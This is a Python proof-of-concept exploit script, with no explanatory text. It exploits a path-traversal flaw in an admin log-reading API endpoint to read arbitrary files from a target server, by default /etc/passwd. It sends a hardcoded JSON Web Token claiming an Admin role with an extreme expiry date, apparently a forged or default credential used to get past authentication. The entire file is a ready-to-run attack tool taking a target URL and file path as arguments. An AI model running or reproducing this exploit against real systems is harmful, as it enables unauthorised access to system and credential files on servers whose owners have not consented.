#!/usr/bin/env python3
import argparse
import requests

class colors:
    cyan = "\033[96m"
    reset = "\033[0m"

def find_file(url, file_path):
    url = f"{url}/api/v1/admin/read/log?log_file_name=../../../{file_path}"
    
    headers = {
        "Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA",
        "accept": "application/json"
    }
    
    response = requests.get(url, headers=headers)
    response = response.text
    
    data_str = f'{response}'
    start = data_str.find('[') + 1
    end = data_str.find(']')
    content = data_str[start:end]

    data = content.replace(',', '\n')

    print(data)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", type=str, required=True, help="Base target url")
    parser.add_argument("-f", "--file-path", type=str, required=False, default="/etc/passwd", help="Path to file that will be read")
    args = parser.parse_args()
    
    url = str(args.url)
    file_path = str(args.file_path)
    
    find_file(url, file_path)

if __name__ == "__main__":
    main()